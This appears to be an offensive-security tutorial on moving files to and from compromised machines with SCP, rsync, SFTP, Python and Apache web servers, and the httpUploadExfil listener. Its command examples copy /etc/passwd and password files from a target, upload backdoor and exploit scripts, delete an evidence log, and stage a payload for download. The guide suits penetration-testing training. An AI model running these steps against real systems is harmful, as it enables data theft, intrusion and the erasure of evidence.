Remote file transfers are a critical aspect of offensive cyber operations, enabling operators to exfiltrate data, deploy payloads, maintain persistence, and manipulate files on target systems. Whether exfiltrating sensitive documents, transferring tools for post-exploitation or maintaining an operational foothold, having efficient and stealthy methods for file transfer is essential.

Different protocols and tools facilitate remote file transfers, each with unique advantages depending on the level of stealth, speed, and reliability required in an operation. The most used methods in offensive security are Secure Copy (SCP), Remote Sync (RSYNC) and SSH File Transfer Protocol (SFTP). However, we will also discuss more modern tools to include the Apache webserver and httpUploadExfil.
# SCP
SCP is a secure method for transferring files between systems over SSH. It is widely used because it is fast, secure and does not require additional setup beyond an active SSH service on the target system and its credentials.
## How it works:
- SCP leverages SSH encryption to securely transfer files
- Uses SSH authentication (password or SSH keys)
- Supports one-time transfers but lacks synchronization features
## Pros & Cons
### Pros
- Encrypted (via SSH)
- Fast and simple
- Available by default on Linux and macOS
### Cons
- No built-in file synchronization
- Requires SSH access and credentials
- High network visibility and is easily logged
## Usage
- To upload a file to a target machine
```bash
scp FILE USERNAME@TARGET_IP:/tmp/
```
- Downloading a file from a target machine to your current directory
```bash
scp USERNAME@TARGET_IP:/etc/passwd .
```
- Recursive transfer of an entire folder
```bash
scp -r FOLDER USERNAME@TARGET_IP:/home/user/
```
# RSYNC
RSYNC is a fast and efficient file transfer tool that allows incremental file synchronization between local and remote machines. It is often used in post-exploitation scenarios where attackers need continuous or stealthy file transfers.
## How it works:
- Uses SSH for secure transport but can work without it.
- Transfers only modified parts of a file instead of the whole file.
- Supports compression with the “-z” flag which can reduce network traffic.
## Pros & Cons
### Pros
- Highly efficient and only syncs changes
- Supports compression & encryption
- Useful for large transfers
### Cons
- More complex than SCP
- Visible in SSH logs
- Requires SSH access with credentials
## Usage
- synchronizing a local folder with a remote machine
```bash
rsync -avz LOCAL_DIRECTORY USERNAME@TARGET_IP:/home/user/tools/
```
- Exfiltrating files from the target system to the current directory
```bash
rsync -avz USERNAME@TARGET_IP:/var/logs/ .
```
- Stealthy file transfer by obscuring timestamps
```bash
rsync -avz --no-perms --no-owner --no-group FILE USERNAME@TARGET_IP:/tmp/
```
# SFTP
SFTP is a secure, interactive file transfer protocol built into SSH. It provides a command-line interface like FTP but with SSH encryption
## How it works:
- Uses SSH for secure authentication and encryption
- Interactive CLI that allows for browsing, uploading, downloading, and deleting files
- Can be used manually or automated via scripts
## Pros & Cons
### Pros
- Encrypted via SSH
- Interactive file browsing
- Supports automation
### Cons
- Slower than SCP and RSYNC
- Requires SSH authentication and credentials
- More network visibility than RSYNC
## Usage
- Connecting to a remote system
```bash
sftp USERNAME@TARGET_IP
```
- Navigating and transferring files interactively
```bash
sftp>ls
sftp>cd /var/www/
sftp>put exploit.sh #upload a file
sftp>get passwords.txt #download a file
sftp>rm evidence.log #delete a file
```
- Batch mode transfer for automation
```bash
sftp user@192.168.1.100 << EOF 
put backdoor.sh
get secret.zip
bye
EOF
```
## Conclusion
Each method has different use cases in offensive operations, depending on the stealth, speed, and operational goals required. SCP is the fastest and simplest way to transfer files over SSH. RSYNC is the best for large datasets, stealthy exfiltration, and incremental updates. SFTP provides an interactive way to browse, upload, and delete files securely.

# Other File Transfer Methods
## Python http.server module
Python includes a built-in lightweight HTTP server that can serve files from a directory over HTTP. This makes it ideal for quick file transfers when working with compromised hosts, RADS, or C2 servers
### How it works:
- When executed, “python3 -m http.server” starts an HTTP service in the current directory.
- Any files in that directory are accessible via a browser or tools like “wget” and “curl”.
- This allows fast retrieval of payloads, tools, or scripts on a target system.
### Installation
Python HTTP server does not require installation because it is available by default.
### Usage
- Starting a simple HTTP server
```bash
python3 -m http.server PORT_NUMBER
```
# Downloading and Delivering Files
## Apache HTTP Server
Apache is a powerful, persistent web server that can be used for long-term file hosting, payload staging, and C2 operations. Unlike Python’s HTTP server, Apache offers authentication, encryption (SSL) and stealth configurations in addition to running in the background (not hogging a terminal).
### How it works:
- Apache serves files from the “/var/www/html” directory by default
- Attackers can host payloads, exfiltrated data, or implant updates.
- Can be secured with basic authentication and SSL/TLS
- By default, Apache runs on port 80
### Installation
- Update your system
```bash
sudo apt update && sudo apt upgrade -y
```
- Start the service
```bash
sudo systemctl start apache2
```
- enable the service to start on boot
```bash
sudo systemctl enable apache2
```
- Verify Apache is running looking for keywords "Active" and "Enabled" in the output of the following command
```bash
sudo systemctl status apache2
```
- Moving payloads to Apache for delivery (requires sudo)
```bash
sudo mv exploit.exe /var/www/html/
```
- The file is now accessible at http://your_ip/exploit.exe
## httpUploadExfil
httpUploadExfil is a specialized exfiltration tool designed to stealthily upload files via HTTP POST requests. Unlike python or Apache this tool is meant for covert data theft from a compromised machine and provides GUI access via the browser in the target machine to send files back to your Local machine.
### How it works:
- A listener is set up on the attacker’s machine
- The compromised machine uploads data using an HTTP POST request
- The attacker retrieves the exfiltrated files from the listener.
### Installation
- Clone and run httpUploadExfil
```bash
git clone https://github.com/tennc/httpuploadexfil.git
```
- Move into the directory
```bash
cd httpuploadexfil
```
- You can then make the binary executable with the following
```bash
sudo chmod +x httpuploadexfil
```
- Execute the listener with
```bash
httpuploadexfil PORT_NUMBER DIRECTORY_FOR_UPLOADED_FILES
```
- OR you can execute the python script
```bash
python3 httpuploadexfil.py PORT_NUMBER DIRECTORY_FOR_UPLOADS
```
